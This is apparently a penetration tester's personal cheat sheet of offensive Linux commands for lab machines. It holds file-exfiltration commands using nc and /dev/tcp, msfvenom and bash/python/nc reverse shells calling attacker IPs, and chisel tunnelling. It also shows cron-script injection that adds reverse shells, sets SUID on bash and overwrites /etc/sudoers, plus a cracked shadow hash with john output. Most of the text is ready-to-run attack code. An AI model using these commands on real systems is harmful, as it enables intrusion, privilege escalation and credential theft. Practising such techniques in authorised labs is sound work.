
### transfer files

##### scp

on the kali
```
sudo service ssh start
```

on the remote
```
from kali to target:
scp pinklii@<ip>:<s_path> <d_path>

from target to kali:
scp <s_path> pinklii@192.168.45.238:<d_path>
```

then on the kali
```
sudo service ssh stop
```

##### nc

open lister on kali
```
nc -lvnp 8080 > dest_file
```

on target
```
cat dest_file > /dev/tcp/kali_ip/8080
```
##### wget

open python server on kali or apache server

apache
```
systemctl restart apache2
```

python
```
python3 -m http.server 8000
```

on target:
```
wget -f http://<ip>:<port>/<file_path>
```

##### curl

open python server on kali or apache server

apache
```
systemctl restart apache2
```

python
```
python3 -m http.server 8000
```

```
curl http://<ip>:<port>/<file_path> > file
```


##### FTP / TFTP

start ftp server and upload/download files

##### metasploit

create meterpreter shell and use upload and download modules


### compile

on my kali (ARM) for arch x86_64 linux machine
```
x86_64-linux-gnu-gcc -o exploit exploit.c
```

shared object
```
gcc -o my_program my_program.c -Wl,--dynamic-linker=/lib64/ld-linux-x86-64.so.2
```
### revers shell

msfvenom 
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf

msfvenom -p linux/x86/shell_reverse_tcp -f elf -o shell LHOST=IP LPORT=PORT

msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.160 LPORT=4444 -f raw -o shell.sh
```

nc
```
nc -e /bin/sh 192.168.45.160 8000
```

bash/sh
```
/bin/sh -i >& /dev/tcp/192.168.45.160/4444 0>&1

/bin/bash -i >& /dev/tcp/192.168.45.160/4444 0>&1

bash -i >& /dev/tcp/192.168.45.160/4444 0>&1
```

python
```
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.17.1",1337)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

normal shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
import pty; pty.spawn("/bin/bash")
/bin/bash -i
```

### Tunnel

In local machine,

```
./chisel_server server -p 9001 --reverse
```

In target machine,

```
wget http://192.168.45.176:8000/chisel/chisel_linux64

chmod +x chisel_linux64

./chisel_linux64 client 192.168.45.160:9001 R:6379:127.0.0.1:6379
```

### escape rbash
```
eleanor@peppo:~$ed
!'/bin/bash'
eleanor@peppo:~$export PATH=/bin:/sbin:/usr/bin:/usr/sbin:$PATH
```

### search file

```
find / -type f -name "local.txt" 2>/dev/null

# files that run as root and I can change them
find / -user root -perm -o+w -type f -name "*.sh" 2>/dev/null

find / -user root -perm -o+w -type f -name "*.py" 2>/dev/null
```

### cron jobs manipulation

revers shell
```
echo "/bin/sh -l > /dev/tcp/192.168.45.202/80 0<&1 2>&1" >> /opt/log-backup.sh
echo 'bash -c "bash -i >& /dev/tcp/10.10.16.4/9999 0>&1"' > privesc.sh
```

SUID / SUDO
```
echo "chmod u+s /bin/bash" >> /opt/log-backup.sh
echo "observer ALL=(root) NOPASSWD: ALL" > /etc/sudoers
```

### crack shadow password

```
└─$ cat thor.txt          
thor:$6$l2ThCEsvmrzmkKIA$FWtAb1SsYFqAXA96Ze4uGTHtPV9HNi7ShAgoTet1gx.HvkEFePp.Bk/uBeuxpCMz/X3jXWbGavj11po9H/FzP.

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt thor.txt --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
valkyrie         (thor)     
1g 0:00:00:04 DONE (2024-09-16 16:58) 0.2487g/s 5349p/s 5349c/s 5349C/s mydarling..230990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

if doesnt work try to write to shadow file: https://int0x33.medium.com/day-40-privilege-escalation-linux-by-modifying-shadow-file-for-the-easy-win-aff61c1c14ed

### abuse PATH

```
export "PATH=$(pwd):/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```
